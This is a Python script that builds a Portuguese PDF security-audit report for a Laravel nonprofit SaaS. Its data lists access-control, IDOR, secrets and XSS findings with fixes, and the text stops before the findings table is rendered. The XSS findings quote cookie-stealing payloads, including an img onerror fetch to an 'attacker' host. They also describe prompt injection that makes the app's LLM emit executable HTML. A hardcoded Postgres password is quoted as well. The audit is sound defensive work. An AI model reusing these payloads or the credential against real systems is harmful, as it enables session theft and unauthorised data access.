#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Gerador do PDF de auditoria de segurança do Vivensi.

Uso (a partir de docs/security-audit/):
    .venv/Scripts/python.exe gerar_relatorio.py

Saída: relatorio-auditoria-seguranca.pdf (mesma pasta)

Requisitos: reportlab, matplotlib (instalados no venv local).
"""

import os
import textwrap
from pathlib import Path
from datetime import date
from xml.sax.saxutils import escape as _xml_escape

def esc(s: str) -> str:
    """Escape para Paragraph do reportlab (que interpreta &lt;a&gt;/&lt;b&gt; como tags)."""
    return _xml_escape(str(s), {'"': "&quot;", "'": "&#39;"})

def wrap_code(text: str, width: int = 118) -> str:
    """Envelopa cada linha em `width` colunas, preservando indent de itens."""
    out = []
    for line in text.splitlines():
        if len(line) <= width:
            out.append(line)
            continue
        # Detecta indent (2 espaços) e prefixo de item (- , 1.)
        stripped = line.lstrip()
        indent = line[: len(line) - len(stripped)]
        cont_indent = indent + "  "
        wrapped = textwrap.wrap(
            stripped, width=width - len(indent),
            break_long_words=True, break_on_hyphens=False,
        )
        if not wrapped:
            out.append(line)
            continue
        out.append(indent + wrapped[0])
        for w in wrapped[1:]:
            out.append(cont_indent + w)
    return "\n".join(out)

import matplotlib
matplotlib.use("Agg")
import matplotlib.pyplot as plt

from reportlab.lib.pagesizes import A4
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import cm
from reportlab.lib import colors
from reportlab.lib.enums import TA_LEFT, TA_CENTER, TA_JUSTIFY
from reportlab.platypus import (
    BaseDocTemplate, PageTemplate, Frame,
    Paragraph, Spacer, Image, Table, TableStyle, PageBreak, KeepTogether,
    Preformatted, XPreformatted,
)
from reportlab.pdfgen import canvas

HERE = Path(__file__).resolve().parent
PDF = HERE / "relatorio-auditoria-seguranca.pdf"

PALETTE = {
    "critica":   "#B91C1C",
    "alta":      "#EA580C",
    "media":     "#D97706",
    "baixa":     "#2563EB",
    "informativa": "#64748B",
    "forte":     "#059669",
}

# ---------------------------------------------------------------------------
# DADOS DA AUDITORIA
# ---------------------------------------------------------------------------

FINDINGS = [
    # ---- Categoria 2: Permissão só no front (mais grave) ----
    {
        "cat": "Permissão só no front", "sev": "critica",
        "file": "app/Http/Controllers/TeamController.php:31-83",
        "route": "routes/partials/ngo.php:29-32 (POST/PUT/DELETE /ngo/team)",
        "desc": "Privilege escalation direto. TeamController@store grava `$user->role = $request->role;` validado apenas `in:ngo,manager,employee`, sem `authorize` nem verificação de papel do caller.",
        "why": "Qualquer usuário autenticado do tenant (employee/common/manager) chama POST /ngo/team com role=ngo e cria um Administrador (Acesso Total). Via PUT /ngo/team/{id} pode promover a si mesmo.",
        "fix": "Adicionar `middleware('can:manage-team')` na rota + gate no AuthServiceProvider aceitando só role=ngo|super_admin. Aplicar `abort_unless(in_array(auth()->user()->role, ['ngo','super_admin']), 403)` em store/update/destroy.",
    },
    {
        "cat": "Permissão só no front", "sev": "alta",
        "file": "app/Http/Controllers/HumanResourcesController.php:94-215",
        "route": "routes/partials/ngo.php:92-100",
        "desc": "storeEmployee/updateEmployee/destroyEmployee/storeVolunteer/updateVolunteer/destroyVolunteer/logHours/toggleStatus sem gate — grep zero matches em role/authorize/Gate/abort.",
        "why": "role=common/employee/manager do tenant pode criar/apagar funcionários e voluntários (com salário/CPF/PIS), toggle status, emitir certificados. Menu escondido, endpoint aberto.",
        "fix": "Aplicar gate `manage-hr` ou `abort_unless(in_array(role,['ngo','super_admin']))` nos handlers de mutação.",
    },
    {
        "cat": "Permissão só no front", "sev": "alta",
        "file": "app/Http/Controllers/TransparencyController.php (múltiplos)",
        "route": "routes/partials/ngo.php:230-239",
        "desc": "updatePortal, addBoardMember, updateBoardMember, deleteBoardMember, addDocument, deleteDocument, addPartnership, updatePartnership, deletePartnership — sem gate.",
        "why": "common/employee do tenant altera o portal público de transparência da ONG (conselho, documentos, parcerias), afetando o site externo.",
        "fix": "Gate `manage-transparency` restrito a ngo|super_admin.",
    },
    {
        "cat": "Permissão só no front", "sev": "alta",
        "file": "app/Http/Controllers/SicController.php",
        "route": "routes/partials/ngo.php:224-227",
        "desc": "respond e updateStatus sem gate.",
        "why": "SIC (Serviço de Informação ao Cidadão) é obrigação LAI; qualquer user do tenant pode responder/fechar chamados oficiais em nome da ONG, sem trilha de autorização.",
        "fix": "Gate `manage-sic` restrito a ngo|super_admin + registrar `responded_by_user_id` na resposta.",
    },
    {
        "cat": "Permissão só no front", "sev": "media",
        "file": "app/Http/Controllers/NgoDonorController.php:45-140",
        "route": "routes/partials/ngo.php:8-15",
        "desc": "store, update, destroy, regenerateToken, sendPortalEmail — sem gate. Só tenant_id scope.",
        "why": "common/employee do tenant faz CRUD de doadores (PII: email, phone, address_zip, document), regenera tokens de portal, dispara emails em nome da entidade.",
        "fix": "Gate `manage-donors` limitando a ngo|manager|super_admin.",
    },
    {
        "cat": "Permissão só no front", "sev": "media",
        "file": "app/Http/Controllers/ContractController.php",
        "route": "routes/partials/ngo.php:44-49",
        "desc": "store, regenerateLink, revokeLink — sem authorize/role/Gate/abort.",
        "why": "common/employee do tenant emite contratos digitais, regenera/revoga links públicos de assinatura em nome da entidade.",
        "fix": "Gate `manage-contracts` restrito a ngo|manager|super_admin.",
    },
    {
        "cat": "Permissão só no front", "sev": "media",
        "file": "app/Http/Controllers/AssetController.php + InventoryController.php",
        "route": "routes/partials/ngo.php:140-165",
        "desc": "store, update, destroy, movement — só tenant_id scope, sem gate por papel.",
        "why": "common do tenant altera Patrimônio e Almoxarifado (registrar/apagar bens, gerar termos, baixa em movimentação). Bypass de segregação de funções dentro do tenant.",
        "fix": "Gate `manage-assets` (ngo|manager|super_admin).",
    },
    {
        "cat": "Permissão só no front", "sev": "media",
        "file": "CampaignController.php:24 (store), BudgetController.php (store), ReceiptController.php (regenerate/revokeLink)",
        "route": "routes/partials/ngo.php (múltiplos)",
        "desc": "Handlers de mutação sem gate.",
        "why": "Cadastro de campanhas de captação, orçamento anual e links de recibos abertos a todo user do tenant. Fere segregação de funções.",
        "fix": "Gates `manage-campaigns`/`manage-budget`/`manage-receipts`.",
    },
    {
        "cat": "Permissão só no front", "sev": "baixa",
        "file": "app/Http/Controllers/Mei/MeiReceiptController.php + ClientController.php",
        "route": "routes/partials/personal.php (todo o prefix)",
        "desc": "prefix personal só com `auth+subscription`, sem check de role=common.",
        "why": "user role=ngo/manager/employee acessa/manipula clientes MEI e recibos NFS-e do painel Personal do mesmo tenant. Impacto reduzido (mesma organização), UI escondida.",
        "fix": "Middleware `role:common,super_admin` no prefix personal.",
    },

    # ---- Categoria 4: Segredos ----
    {
        "cat": "Segredos expostos", "sev": "media",
        "file": "scripts/purge-vivensi-bot.sh:10",
        "route": "N/A (script commitado)",
        "desc": "PGPASSWORD='evolution@2026' hardcoded via export num shell script commitado.",
        "why": "Se o repo vazar (ou dev clonar em máquina comprometida), atacante ganha acesso direto ao Postgres da Evolution na VPS (Message + Chat WhatsApp — LGPD). Depende de exposição de rede à Postgres.",
        "fix": "Mover credencial pra /root/.pgpass (chmod 600) ou /etc/vivensi/purge.env com `source`. Rotacionar a senha atual no Postgres. Ajustar cron pra ler de arquivo fora do repo.",
    },
    {
        "cat": "Segredos expostos", "sev": "baixa",
        "file": ".github/workflows/laravel.yml:57",
        "route": "N/A",
        "desc": "APP_KEY base64 fixa usada só no job Pest do CI. Já está no allowlist do .gitleaks.toml.",
        "why": "Não é a APP_KEY de produção. Prod tem chave própria (memory confirma .env restaurado 2026-08-18). Boa prática: mover para `secrets.CI_APP_KEY`.",
        "fix": "Trocar `APP_KEY: base64:...` por `APP_KEY: ${{ secrets.CI_APP_KEY }}` e cadastrar o secret no repo.",
    },
    {
        "cat": "Segredos expostos", "sev": "baixa",
        "file": "docker-compose.yml:18,35,38",
        "route": "N/A",
        "desc": "Defaults `secret`/`rootsecret` em `${DB_PASSWORD:-secret}` e `${MYSQL_ROOT_PASSWORD:-rootsecret}`.",
        "why": "Compose não é usado em prod (VPS Lightsail com XAMPP/nginx). Se alguém rodar `docker-compose up` sem .env, sobe container com senha trivial. Não explorável hoje.",
        "fix": "Trocar defaults por `${DB_PASSWORD:?required}` — falha o compose se env ausente.",
    },

    # ---- Categoria 5: XSS ----
    {
        "cat": "XSS", "sev": "media",
        "file": "resources/views/prospecting/index.blade.php:403",
        "route": "GET /prospecting (painel manager)",
        "desc": "`<a href=\"{{ $prospect->website }}\" target=\"_blank\">` renderizando URL vinda do Serper (Google Maps Places) sem validar scheme.",
        "why": "Dono do perfil no Google Maps controla o `website` da listagem. Cadastra `javascript:alert(document.cookie)` ou `data:text/html,...`. Admin clica → executa no contexto vivensi.app.br (cookies de sessão).",
        "fix": "Validar scheme em `LeadSearchService::persist()`: `Str::startsWith($url, ['http://','https://'])` antes de gravar. Fallback vazio se inválido. Ou envolver com helper `safe_url()` na view.",
    },
    {
        "cat": "XSS", "sev": "media",
        "file": "resources/views/partials/chat_widget.blade.php:192",
        "route": "GET /chat (widget global)",
        "desc": "`div.innerHTML = marked.parse(text);` para mensagens do assistente (Bruce AI), sem DOMPurify.",
        "why": "marked não sanitiza HTML embutido em markdown por default. Prompt injection via dado do próprio tenant (nome de projeto/transação/mensagem anterior) reflete `<img src=x onerror=fetch('//attacker/'+document.cookie)>` na resposta do LLM. LLM não é fronteira de confiança.",
        "fix": "Copiar padrão do `grants/show.blade.php:606` — `<script src=\"...dompurify...\">` e `div.innerHTML = DOMPurify.sanitize(marked.parse(text));`.",
    },
    {
        "cat": "XSS", "sev": "media",
        "file": "dashboards/ngo.blade.php:665 + common.blade.php:619 + manager.blade.php:576",
        "route": "GET /dashboard (todos)",
        "desc": "`el.innerHTML = <p>${data.insight.replace(/\\*\\*(.*?)\\*\\*/g,'<strong>$1</strong>').replace(/\\n/g,'<br>')}</p>` — insight do LLM injetado sem escape.",
        "why": "Mesmo padrão de prompt injection do chat_widget. Sem escape HTML prévio e sem DOMPurify, LLM que retorne `<img src=x onerror=...>` executa no dashboard.",
        "fix": "Escapar HTML antes do markdown-lite ou aplicar DOMPurify em todos os 3 arquivos.",
    },
    {
        "cat": "XSS", "sev": "baixa",
        "file": "resources/views/ngo/conformidade/dashboard.blade.php:307-308",
        "route": "GET /ngo/conformidade/dashboard",
        "desc": "`const labels = {!! $chartLabels !!}; const data = {!! $chartData !!};` — JSON server-side sem flags JSON_HEX_TAG/AMP/APOS/QUOT.",
        "why": "Server formata `format('d/m')` e cast `(float)` — não explorável hoje. Inconsistência com outras views (ngo.blade.php/common.blade.php/manager.blade.php) que usam as flags. Quebra se alguém trocar por label do banco.",
        "fix": "Usar `->toJson(JSON_HEX_TAG|JSON_HEX_AMP|JSON_HEX_APOS|JSON_HEX_QUOT)`.",
    },
    {
        "cat": "XSS", "sev": "informativa",
        "file": "app/Http/Middleware/SecurityHeaders.php:54",
        "route": "middleware global",
        "desc": "CSP existe (bom), mas `script-src 'self' ... 'unsafe-inline'` e `style-src 'self' ... 'unsafe-inline'`.",
        "why": "'unsafe-inline' anula o principal ganho anti-XSS do CSP. Migrar para nonce/hash é trabalhoso (todas as views usam <script> inline). Dívida técnica.",
        "fix": "Roadmap para adotar nonces por request (Alpine, chart.js, insights) e remover unsafe-inline.",
    },

    # ---- Categoria 3: IDOR ----
    {
        "cat": "IDOR", "sev": "baixa",
        "file": "app/Http/Controllers/HumanResourcesController.php:452-509 (downloadVolunteerCertificate)",
        "route": "GET /ngo/hr/volunteers/{v}/certificates/{c}/download",
        "desc": "`VolunteerCertificate::findOrFail($id)` sem filtro de tenant; depois valida `Volunteer` do tenant. VolunteerCertificate não usa BelongsToTenant.",
        "why": "Se cert.volunteer_id colidir com um voluntário do tenant do atacante, o PDF servido é do certificado cross-tenant. File_path servido do disk 'public'.",
        "fix": "Adicionar coluna `tenant_id` + trait BelongsToTenant em VolunteerCertificate. Ou `-> where('volunteer_id', $volunteer->id)` no findOrFail.",
    },
    {
        "cat": "IDOR", "sev": "baixa",
        "file": "app/Http/Controllers/PublicRaffleController.php:136-165 (uploadReceipt)",
        "route": "POST /rifa/ticket/{id}/comprovante",
        "desc": "`RaffleTicket::findOrFail($ticketId)` (rota pública) com guarda `strtolower(buyer_email) === request(email)`. Email não é segredo.",
        "why": "Quem descobre email do comprador (aparece em recibos/emails) faz upload substituindo o comprovante do ticket. Também enumeração de ticketIds sequenciais.",
        "fix": "Trocar `id + email` por token opaco `Str::random(40)` armazenado como HMAC bidx, comparado com `hash_equals`.",
    },
    {
        "cat": "IDOR", "sev": "baixa",
        "file": "app/Http/Controllers/MeetingBookingController.php:72-81",
        "route": "GET /booking/cancel/{token}",
        "desc": "`MeetingBooking::where('confirmation_token', $token)` — token gravado plaintext no DB, sem HMAC nem hash_equals.",
        "why": "Str::random(40) tem entropia, mas se DB vazar (backup, dump) atacante cancela todas as reuniões pendentes. Padrão do resto do projeto (Contract/NgoDonor/WhatsappFormSession) é HMAC bidx.",
        "fix": "Gravar `token_bidx = hash_hmac('sha256', $raw, config('app.key'))` e comparar via `where(token_bidx, hash)` + `hash_equals`.",
    },
    {
        "cat": "IDOR", "sev": "informativa",
        "file": "app/Http/Controllers/LandingPageController.php:426-432 (updateOrder)",
        "route": "N/A (método não roteado)",
        "desc": "`foreach $request->order as $item: LandingPageSection::where('id',$item.id)->update(...)` sem tenant check. Método órfão — grep confirma zero rotas apontando pra ele.",
        "why": "Não explorável hoje. Se roteado no futuro sem revisar, vira IDOR clássico (reordena landings de qualquer tenant).",
        "fix": "Deletar o método ou adicionar `whereHas('landingPage', fn($q)=>$q->where('tenant_id', auth()->user()->tenant_id))`.",
    },
]

STRONG_POINTS = [
    "Categoria 1 (isolamento de tenant): 0 achados. BelongsToTenant fail-closed em 90/103 models tenant-scoped; controllers que precisam withoutGlobalScope sempre parear com `where('tenant_id', $tenantId)` derivado de auth() — nunca de input.",
    "AttachmentController: whitelist morphType + tenant check + BelongsToTenant no próprio Attachment — proof anti-IDOR nos anexos polimórficos (docs, avatars, contratos).",
    "Rotas públicas (donor portal, contract sign, campanhas /c/{slug}, transparência, SIC, recibos) usam token opaco HMAC bidx via `hash_hmac('sha256', $raw, app.key)` + `firstOrFail` + `hash_equals` — padrão idiomático correto.",
    "routes/partials/admin.php aplica middleware('super_admin') no prefix inteiro — todas as ~200 rotas /admin/* protegidas server-side.",
    "Gates existentes bem aplicados: can:manage-grants (todo /ngo/grants), can:delete-beneficiaries (com blade @can), can:access-manager (marketing/kanban/manager/*), can:has-whatsapp-cloud (templates). Servem de padrão para os outros módulos NGO que faltam gate.",
    "Categoria 4 (segredos): gitleaks em pre-commit local + CI, allowlist auditada com racional de cada valor rotacionado, script forense verify-leaked-credentials.sh — postura sólida sem reescrever histórico. .env.example só com placeholders.",
    "CSP + X-Frame-Options + X-Content-Type-Options + HSTS + Referrer-Policy ativos via SecurityHeaders middleware global.",
    "HTMLPurifier (mews/purifier) integrado em: admin/pages/edit, public/blog/show, public/page, pages/show, BlogController@store. HTML.ForbiddenElements bloqueia script/object/embed/iframe/form/input/button. URI.AllowedSchemes só http/https/mailto.",
    "Charts com JSON_HEX_TAG|JSON_HEX_AMP|JSON_HEX_APOS|JSON_HEX_QUOT em admin/dashboard, dashboards/ngo, common, ngo/smart_analysis, booking.",
    "Zero uso de eval, v-html, dangerouslySet, document.write no bundle público.",
    "Blade escape default correto em views de exibição pública (transparency, whatsapp/templates, support/show, campaign, contract_sign) usando nl2br(e(...)).",
]

WEAK_POINTS = [
    "Padrão sistêmico: /ngo/* e /personal/* rodam com `auth+subscription` apenas. Quando UI só aparece no branch role=ngo do sidebar, backend confia no front. 9 controllers vulneráveis a bypass de papel INTRA-tenant.",
    "TeamController: privilege escalation direto — user comum vira Administrador via POST /ngo/team. É o único achado CRÍTICO da auditoria; deveria ser corrigido antes de qualquer outra coisa.",
    "Prompt injection em respostas de LLM (chat_widget + dashboards insight) executando via innerHTML sem DOMPurify.",
    "Prospecting: URLs de terceiros (Google Maps) renderizadas sem validação de scheme — vetor javascript:/data: contra admin.",
    "purge-vivensi-bot.sh com senha Postgres hardcoded no repo. Precisa rotacionar + mover pra arquivo fora do repo.",
    "CSP com 'unsafe-inline' anula o ganho anti-XSS. Dívida de médio prazo (migrar Alpine/chart.js pra nonces).",
]

RECOMENDACOES = [
    ("P1", "Fechar TeamController privilege escalation (crítico).", "Adicionar middleware can:manage-team + gate no AuthServiceProvider aceitando role=ngo|super_admin. Cobrir com teste que valida bloqueio de role=common/employee."),
    ("P1", "Adicionar gates aos 3 controllers ALTA severidade (HR, Transparency, SIC).", "Copiar padrão de can:manage-grants. Testes de regressão para cada."),
    ("P1", "Rotacionar senha Postgres da Evolution e remover PGPASSWORD do purge-vivensi-bot.sh.", "Mover pra /root/.pgpass (chmod 600). Redeploy do cron."),
    ("P2", "Aplicar gates aos 4 controllers MÉDIA (Donor, Contract, Asset/Inventory, Campaign/Budget/Receipt).", "Mesma abordagem P1. Considerar gate genérico `ngo-admin` + gates específicos por módulo."),
    ("P2", "Sanitizar 3 pontos de XSS por prompt injection (chat_widget + 3 dashboards).", "Aplicar DOMPurify no innerHTML pós-marked.parse. Copiar padrão do grants/show.blade.php."),
    ("P2", "Validar scheme de URL no prospecting antes de persistir.", "Str::startsWith em LeadSearchService. Fallback vazio para URLs inválidas. Teste com dado malicioso."),
    ("P3", "Aplicar role check no prefix /personal/*.", "Middleware role:common,super_admin. Coordenar com quebra se algum tenant NGO usa MEI intra-org."),
    ("P3", "Migrar 3 IDORs BAIXA para padrão HMAC bidx (VolunteerCertificate, PublicRaffle receipt, MeetingBooking).", "Rotina de refactor — mesma técnica já em uso em Contract/NgoDonor."),
    ("P3", "Uniformizar JSON_HEX flags em ngo/conformidade/dashboard.blade.php.", "toJson com flags. Sem impacto de compat."),
    ("P4", "Deletar método órfão LandingPageController::updateOrder.", "Dead code — removível ou defendido antes de eventual rota."),
    ("P4", "Mover APP_KEY do CI para secrets.CI_APP_KEY.", "Boa prática, sem impacto de segurança em prod."),
    ("P4", "Ajustar defaults do docker-compose para required (`${VAR:?}`).", "Se compose voltar a ser usado."),
    ("P4", "Roadmap CSP nonces (retirar unsafe-inline).", "Dívida de longo prazo. Requer refactor de todas as views com <script> inline."),
]

# ---------------------------------------------------------------------------
# GRÁFICOS (matplotlib -> PNG)
# ---------------------------------------------------------------------------

def _plot_donut():
    counts = {}
    for f in FINDINGS:
        counts[f["sev"]] = counts.get(f["sev"], 0) + 1
    order = ["critica", "alta", "media", "baixa", "informativa"]
    labels_pt = {"critica": "Crítica", "alta": "Alta", "media": "Média", "baixa": "Baixa", "informativa": "Informativa"}
    values = [counts.get(s, 0) for s in order]
    lbls = [labels_pt[s] for s in order]
    cols = [PALETTE[s] for s in order]

    fig, ax = plt.subplots(figsize=(4.8, 4.2), dpi=150)
    wedges, _ = ax.pie(values, colors=cols, wedgeprops=dict(width=0.42, edgecolor="white"))
    ax.set(aspect="equal")
    legend_labels = [f"{l} — {v}" for l, v in zip(lbls, values)]
    ax.legend(wedges, legend_labels, loc="center left", bbox_to_anchor=(1.0, 0.5), frameon=False, fontsize=9)
    ax.text(0, 0, f"{sum(values)}\nachados", ha="center", va="center", fontsize=14, fontweight="bold", color="#0f172a")
    plt.tight_layout()
    p = HERE / "_chart_donut.png"
    fig.savefig(p, bbox_inches="tight", facecolor="white")
    plt.close(fig)
    return p


def _plot_bars():
    cats = {}
    for f in FINDINGS:
        cats.setdefault(f["cat"], []).append(f["sev"])
    cat_names = list(cats.keys())
    sev_order = ["critica", "alta", "media", "baixa", "informativa"]
    labels_pt = {"critica": "Crítica", "alta": "Alta", "media": "Média", "baixa": "Baixa", "informativa": "Informativa"}
    data = {s: [sum(1 for x in cats[c] if x == s) for c in cat_names] for s in sev_order}

    import numpy as np
    x = np.arange(len(cat_names))
    fig, ax = plt.subplots(figsize=(7.5, 4.2), dpi=150)
    bottom = np.zeros(len(cat_names))
    for s in sev_order:
        vals = data[s]
        if sum(vals) == 0:
            continue
        ax.bar(x, vals, bottom=bottom, color=PALETTE[s], label=labels_pt[s], edgecolor="white", linewidth=0.8)
        bottom = bottom + np.array(vals)
    ax.set_xticks(x)
    ax.set_xticklabels(cat_names, rotation=0, fontsize=9)
    ax.set_ylabel("Nº de achados", fontsize=10)
    ax.spines["top"].set_visible(False)
    ax.spines["right"].set_visible(False)
    ax.legend(loc="upper right", frameon=False, fontsize=9)
    ax.yaxis.set_major_locator(plt.MaxNLocator(integer=True))
    plt.tight_layout()
    p = HERE / "_chart_bars.png"
    fig.savefig(p, bbox_inches="tight", facecolor="white")
    plt.close(fig)
    return p


# ---------------------------------------------------------------------------
# PDF
# ---------------------------------------------------------------------------

class VivensiCanvas(canvas.Canvas):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._saved_pages = []

    def showPage(self):
        self._saved_pages.append(dict(self.__dict__))
        self._startPage()

    def save(self):
        total = len(self._saved_pages)
        for state in self._saved_pages:
            self.__dict__.update(state)
            self._draw_frame(total)
            super().showPage()
        super().save()

    def _draw_frame(self, total):
        w, h = A4
        self.setStrokeColor(colors.HexColor("#e2e8f0"))
        self.setLineWidth(0.4)
        self.line(2*cm, h - 1.6*cm, w - 2*cm, h - 1.6*cm)
        self.setFont("Helvetica", 8)
        self.setFillColor(colors.HexColor("#64748b"))
        self.drawString(2*cm, h - 1.3*cm, "Relatório de Auditoria de Segurança — Vivensi")
        self.drawRightString(w - 2*cm, h - 1.3*cm, date.today().strftime("%d/%m/%Y"))
        self.line(2*cm, 1.5*cm, w - 2*cm, 1.5*cm)
        self.drawString(2*cm, 1.15*cm, "Confidencial — uso interno")
        self.drawRightString(w - 2*cm, 1.15*cm, f"Página {self._pageNumber} de {total}")


def _severity_chip(sev):
    labels_pt = {"critica": "Crítica", "alta": "Alta", "media": "Média", "baixa": "Baixa", "informativa": "Informativa"}
    label = labels_pt.get(sev, sev)
    color = colors.HexColor(PALETTE[sev])
    tbl = Table([[label]], colWidths=[2.2*cm], rowHeights=[0.5*cm])
    tbl.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, -1), color),
        ("TEXTCOLOR", (0, 0), (-1, -1), colors.white),
        ("ALIGN", (0, 0), (-1, -1), "CENTER"),
        ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
        ("FONTNAME", (0, 0), (-1, -1), "Helvetica-Bold"),
        ("FONTSIZE", (0, 0), (-1, -1), 8),
        ("ROUNDEDCORNERS", [4, 4, 4, 4]),
    ]))
    return tbl


def build():
    doc = BaseDocTemplate(
        str(PDF), pagesize=A4,
        leftMargin=2*cm, rightMargin=2*cm,
        topMargin=2.2*cm, bottomMargin=2*cm,
        title="Auditoria de Segurança — Vivensi",
        author="Vivensi Security",
    )
    frame = Frame(doc.leftMargin, doc.bottomMargin, doc.width, doc.height, id="body")
    doc.addPageTemplates([PageTemplate(id="main", frames=[frame])])

    styles = getSampleStyleSheet()
    h1 = ParagraphStyle("h1", parent=styles["Heading1"], fontSize=20, textColor=colors.HexColor("#0f172a"), spaceAfter=10)
    h2 = ParagraphStyle("h2", parent=styles["Heading2"], fontSize=14, textColor=colors.HexColor("#0f172a"), spaceAfter=6, spaceBefore=12)
    h3 = ParagraphStyle("h3", parent=styles["Heading3"], fontSize=11, textColor=colors.HexColor("#334155"), spaceAfter=4, spaceBefore=8)
    body = ParagraphStyle("body", parent=styles["BodyText"], fontSize=9.5, textColor=colors.HexColor("#0f172a"), leading=13, alignment=TA_JUSTIFY)
    small = ParagraphStyle("small", parent=styles["BodyText"], fontSize=8.5, textColor=colors.HexColor("#334155"), leading=11)
    mono = ParagraphStyle("mono", parent=styles["Code"], fontSize=7, textColor=colors.HexColor("#0f172a"), leading=9, backColor=colors.HexColor("#f1f5f9"), leftIndent=4, rightIndent=4, spaceBefore=2, spaceAfter=2, wordWrap="CJK")
    cover_title = ParagraphStyle("cover_title", parent=styles["Title"], fontSize=26, textColor=colors.HexColor("#0f172a"), alignment=TA_CENTER, spaceAfter=16)
    cover_sub = ParagraphStyle("cover_sub", parent=styles["Normal"], fontSize=12, textColor=colors.HexColor("#475569"), alignment=TA_CENTER, spaceAfter=6)

    story = []

    # ---------- CAPA ----------
    story.append(Spacer(1, 3.5*cm))
    story.append(Paragraph("Relatório de Auditoria de Segurança", cover_title))
    story.append(Paragraph("Vivensi — Ecossistema SaaS para Terceiro Setor", cover_sub))
    story.append(Spacer(1, 0.5*cm))
    story.append(Paragraph(f"Data: {date.today().strftime('%d de %B de %Y').replace('August','agosto').replace('September','setembro').replace('October','outubro').replace('November','novembro').replace('December','dezembro').replace('January','janeiro').replace('February','fevereiro').replace('March','março').replace('April','abril').replace('May','maio').replace('June','junho').replace('July','julho')}", cover_sub))
    story.append(Paragraph("Stack auditada: Laravel 9 (PHP 8), Eloquent, Blade, MySQL, Redis, sessions", cover_sub))
    story.append(Spacer(1, 1*cm))

    meta = """<b>Escopo auditado.</b> Base de código completa em <font face="Courier">C:\\xampp\\htdocs\\vivensi-laravel</font> — 161 controllers, ~1400 linhas de rotas em 11 partials, models, views Blade, middlewares, config, scripts, workflows CI e docker-compose. Auditoria linha-a-linha nos handlers de rota; grep sistemático nos padrões de risco.<br/><br/>
    <b>Nota metodológica.</b> As cinco categorias do escopo foram mapeadas para o stack:
    (1) <i>Isolamento de tenant</i> = trait BelongsToTenant + global scope + filtros manuais por auth()->user()->tenant_id;
    (2) <i>Permissão só no front</i> = @can/@role/isX() no Blade cruzado com abort_unless/Gate::authorize/middleware nos controllers;
    (3) <i>IDOR</i> = handlers show/edit/update/destroy/download com Route::findOrFail sem posse verificada;
    (4) <i>Segredos</i> = grep de padrões conhecidos + revisão manual de .env.example, config/, scripts/, workflows/, docker-compose, bundle público;
    (5) <i>XSS</i> = {!! !!} sem sanitização, innerHTML/marked.parse em JS, URLs sem validação de scheme, ausência de purifier.<br/><br/>
    <b>Contexto de auditorias prévias.</b> Findings já fechados em C1 (withoutGlobalScope), C2 (settings), C3 (LGPD self-service), C4 (PII encryption), pentest 2026-07-05 e broadcast/projects/grants 2026-08-01 <b>não</b> foram re-flagados exceto quando há nova evidência de regressão."""
    story.append(Paragraph(meta, body))
    story.append(PageBreak())

    # ---------- RESUMO EXECUTIVO ----------
    story.append(Paragraph("Resumo Executivo", h1))

    counts = {"critica": 0, "alta": 0, "media": 0, "baixa": 0, "informativa": 0}
    for f in FINDINGS:
        counts[f["sev"]] += 1
    total = sum(counts.values())

    resumo_texto = f"""A auditoria identificou <b>{total} achados</b> distribuídos em: <b>{counts['critica']} crítica</b>, <b>{counts['alta']} altas</b>, <b>{counts['media']} médias</b>, <b>{counts['baixa']} baixas</b> e <b>{counts['informativa']} informativas</b>. O único achado crítico é uma <b>escalação de privilégio</b> no <font face="Courier">TeamController</font> (qualquer usuário do tenant pode se promover a administrador). As categorias de <b>isolamento de tenant</b> e <b>IDOR</b> ficaram praticamente verdes — a arquitetura multi-tenant fail-closed do BelongsToTenant e o padrão HMAC bidx nas rotas públicas estão bem aplicados. A dívida real está na <b>categoria 2</b> (9 controllers /ngo/* dependem só de UI para gate de papel intra-tenant)."""
    story.append(Paragraph(resumo_texto, body))
    story.append(Spacer(1, 0.4*cm))

    donut_p = _plot_donut()
    bars_p = _plot_bars()
    chart_row = Table(
        [[Image(str(donut_p), width=8.5*cm, height=7*cm), Image(str(bars_p), width=8.5*cm, height=7*cm)]],
        colWidths=[8.5*cm, 8.5*cm]
    )
    chart_row.setStyle(TableStyle([("VALIGN", (0, 0), (-1, -1), "TOP"), ("ALIGN", (0, 0), (-1, -1), "CENTER")]))
    story.append(chart_row)
    story.append(Spacer(1, 0.3*cm))
    story.append(Paragraph("<i>Esquerda: distribuição por severidade. Direita: achados por categoria empilhados por severidade.</i>", small))
    story.append(PageBreak())

    # ---------- PONTOS FORTES ----------
    story.append(Paragraph("Pontos Fortes", h1))
    story.append(Paragraph("Evidências concretas de defesa em profundidade encontradas no código real.", small))
    story.append(Spacer(1, 0.2*cm))
    for sp in STRONG_POINTS:
        chip = Table([[Paragraph("&#10003;", ParagraphStyle("chip", parent=body, textColor=colors.white, alignment=TA_CENTER, fontSize=10, fontName="Helvetica-Bold"))]], colWidths=[0.6*cm], rowHeights=[0.55*cm])
        chip.setStyle(TableStyle([("BACKGROUND", (0, 0), (-1, -1), colors.HexColor(PALETTE["forte"])), ("VALIGN", (0, 0), (-1, -1), "MIDDLE")]))
        row = Table([[chip, Paragraph(esc(sp), body)]], colWidths=[0.9*cm, 15.1*cm])
        row.setStyle(TableStyle([("VALIGN", (0, 0), (-1, -1), "TOP"), ("BOTTOMPADDING", (0, 0), (-1, -1), 6)]))
        story.append(row)

    story.append(Spacer(1, 0.5*cm))
    story.append(Paragraph("Pontos Fracos (riscos centrais)", h1))
    for wp in WEAK_POINTS:
        chip = Table([[Paragraph("!", ParagraphStyle("chip", parent=body, textColor=colors.white, alignment=TA_CENTER, fontSize=10, fontName="Helvetica-Bold"))]], colWidths=[0.6*cm], rowHeights=[0.55*cm])
        chip.setStyle(TableStyle([("BACKGROUND", (0, 0), (-1, -1), colors.HexColor(PALETTE["alta"])), ("VALIGN", (0, 0), (-1, -1), "MIDDLE")]))
        row = Table([[chip, Paragraph(esc(wp), body)]], colWidths=[0.9*cm, 15.1*cm])
        row.setStyle(TableStyle([("VALIGN", (0, 0), (-1, -1), "TOP"), ("BOTTOMPADDING", (0, 0), (-1, -1), 6)]))
        story.append(row)
    story.append(PageBreak())

    # ---------- TABELA DE ACHADOS POR CATEGORIA ----------
    story.append(Paragraph("Achados Detalhados", h1))
    story.append(Paragraph("Ordenados por categoria, decrescente por severidade dentro de cada uma.", small))
    story.append(Spacer(1, 0.3*cm))

